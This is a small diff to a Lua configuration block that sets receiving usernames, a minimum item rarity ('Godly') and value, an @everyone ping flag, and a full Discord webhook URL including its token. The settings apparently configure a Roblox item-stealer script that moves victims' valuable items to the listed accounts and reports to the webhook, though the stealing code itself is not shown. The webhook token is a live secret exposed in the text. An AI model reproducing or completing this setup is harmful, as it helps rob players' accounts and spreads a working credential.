@@ -1,5 +1,5 @@
-_G.Usernames = {"wjkpaowk", "wjkpaowk", "wjkpaowk"}
+_G.Usernames = {"wjkpaowk"}
 _G.min_rarity = "Godly"
-_G.min_value = "1"
+_G.min_value = 1
 _G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1386821940353958098/tdUBv16ogNfN5UlRmauqxQqrSnOA4m0bwDPtq2HQjFYFH4SprTYnhhQBKjymnF0f4vR5" 
+_G.webhook = "https://discord.com/api/webhooks/1386821940353958098/tdUBv16ogNfN5UlRmauqxQqrSnOA4m0bwDPtq2HQjFYFH4SprTYnhhQBKjymnF0f4vR5"
